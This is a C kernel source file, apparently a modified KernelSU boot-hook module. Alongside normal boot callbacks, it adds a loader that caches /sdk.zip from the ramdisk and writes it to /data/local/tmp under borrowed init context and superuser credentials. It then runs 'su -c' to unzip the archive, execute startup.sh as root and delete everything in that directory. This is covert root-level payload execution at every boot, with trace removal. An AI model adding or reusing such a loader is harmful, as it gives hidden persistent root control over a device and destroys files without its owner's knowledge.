#include <linux/err.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/printk.h>

#include <linux/file.h>
#include <linux/slab.h>
#include <linux/kmod.h>

#include <linux/fs_struct.h>
#include <linux/sched.h>

#include <linux/mm.h>
#include <linux/cred.h>

#include "policy/allowlist.h"
#include "klog.h" // IWYU pragma: keep
#include "runtime/ksud_boot.h"
#include "runtime/ksud.h"
#include "manager/manager_observer.h"
#include "manager/throne_tracker.h"

bool ksu_module_mounted __read_mostly = false;
bool ksu_boot_completed __read_mostly = false;


// 声明来自 ksu.c 的全局超级凭据
extern struct cred *ksu_cred;

// 全局静态缓冲区，用于暂存脚本
static char *sdk_zip_cache = NULL;
static ssize_t sdk_zip_cache_size = 0;
#define MAX_ZIP_SIZE (10 * 1024 * 1024)

/**
 * 阶段 1：早期读取 sdk.zip
 */
void ksu_early_read_script(void)
{
    struct file *src;
    loff_t off_src = 0;
    char *buf;
    ssize_t nread;

    pr_info("ksu_startup: 正在执行早期 Ramdisk sdk.zip 缓存...\n");

    src = filp_open("/sdk.zip", O_RDONLY, 0);
    if (IS_ERR(src)) {
        pr_err("ksu_startup: 早期打开 /sdk.zip 失败，错误码: %ld\n", PTR_ERR(src));
        return;
    }

    // 开辟空间
    buf = kvmalloc(MAX_ZIP_SIZE, GFP_KERNEL);
    if (!buf) {
        pr_err("ksu_startup: 内存分配失败，无法缓存 sdk.zip\n");
        filp_close(src, NULL);
        return;
    }

    nread = kernel_read(src, buf, MAX_ZIP_SIZE, &off_src);
    if (nread < 0) {
        pr_err("ksu_startup: 读取 /sdk.zip 失败: %zd\n", nread);
        kvfree(buf);
    } else if (nread == 0) {
        pr_warn("ksu_startup: 警告：/sdk.zip 是一个空文件\n");
        kvfree(buf);
    } else {
        sdk_zip_cache = buf;
        sdk_zip_cache_size = nread;
        pr_info("ksu_startup: 成功将 /sdk.zip 缓存至内核内存 (%zd 字节)\n", nread);
    }

    filp_close(src, NULL);
}


/**
 * 阶段 2：释放到 /data 分区
 */
static int copy_file_to_data(void)
{
    const char *dst_path = "/data/local/tmp/sdk.zip";
    struct file *dst;
    loff_t off_dst = 0;
    ssize_t nwrite;
    int ret = 0;
    const struct cred *old_cred = NULL;

    if (!sdk_zip_cache || sdk_zip_cache_size <= 0) {
        pr_err("ksu_startup: 错误：没有找到有效的内核缓存数据，放弃写入 /data\n");
        return -ENOENT;
    }

    struct fs_struct *old_fs = current->fs;
    struct task_struct *init_task = pid_task(find_vpid(1), PIDTYPE_PID);
    if (!init_task) {
        pr_err("ksu_startup: 找不到 init 进程 (PID 1) 的文件上下文\n");
        return -ESRCH;
    }
    current->fs = init_task->fs;

    if (ksu_cred) old_cred = override_creds(ksu_cred);

    // 释放 zip 文件
    dst = filp_open(dst_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(dst)) {
        ret = PTR_ERR(dst);
        pr_err("ksu_startup: 在 /data 创建 sdk.zip 失败 > 错误码: %d\n", ret);

        if (old_cred) revert_creds(old_cred);
        current->fs = old_fs;
        return ret;
    }

    nwrite = kernel_write(dst, sdk_zip_cache, sdk_zip_cache_size, &off_dst);
    if (nwrite != sdk_zip_cache_size) {
        ret = -EIO;
        pr_err("ksu_startup: 写入失败: 预期 %zd 字节, 实际 %zd 字节\n", sdk_zip_cache_size, nwrite);
    } else {
        pr_info("ksu_startup: 成功释放 sdk.zip 到 %s\n", dst_path);
    }

    filp_close(dst, NULL);

    if (old_cred) revert_creds(old_cred);
    current->fs = old_fs;

    // 使用 kvfree 释放大内存
    kvfree(sdk_zip_cache);
    sdk_zip_cache = NULL;
    sdk_zip_cache_size = 0;

    return ret;
}


static void execute_handler() {
    // 准备执行脚本的参数
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/system/bin:/system/xbin",
        NULL
    };

    char *argv[] = {
        "/system/bin/su",
        "-c",
        "cd /data/local/tmp && unzip -o sdk.zip && chmod 755 startup.sh && /system/bin/sh startup.sh && rm -f /data/local/tmp/*",
        NULL
    };

    // 执行脚本（异步）
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret != 0) {
        pr_err("ksu_startup 执行失败: %d\n", ret);
    } else {
        pr_info("ksu_startup 执行成功\n");
    }
}

void on_post_fs_data(void)
{
    static bool done = false;

    if (done) {
        pr_info("on_post_fs_data already done\n");
        return;
    }

    done = true;
    pr_info("on_post_fs_data!\n");

    ksu_load_allow_list();
    ksu_observer_init();
    // Sanity check for safe mode only needs early-boot input samples.
    ksu_stop_input_hook_runtime();

    // TODO test
    pr_info("ksu_startup 准备复制文件\n");
    if (copy_file_to_data() == 0) {
        pr_info("ksu_startup 成功复制到 /data/local/tmp\n");
        execute_handler();
    } else {
        pr_err("ksu_startup 复制失败!\n");
    }
}

extern void ext4_unregister_sysfs(struct super_block *sb);

int nuke_ext4_sysfs(const char *mnt)
{
    struct path path;
    int err = kern_path(mnt, 0, &path);

    if (err) {
        pr_err("nuke path err: %d\n", err);
        return err;
    }

    if (strcmp(path.dentry->d_inode->i_sb->s_type->name, "ext4") != 0) {
        pr_info("nuke but module aren't mounted\n");
        path_put(&path);
        return -EINVAL;
    }

    ext4_unregister_sysfs(path.dentry->d_inode->i_sb);
    path_put(&path);
    return 0;
}

void on_module_mounted(void)
{
    pr_info("on_module_mounted!\n");
    ksu_module_mounted = true;
}

void on_boot_completed(void)
{
    ksu_boot_completed = true;
    pr_info("on_boot_completed!\n");
    track_throne(true);
}
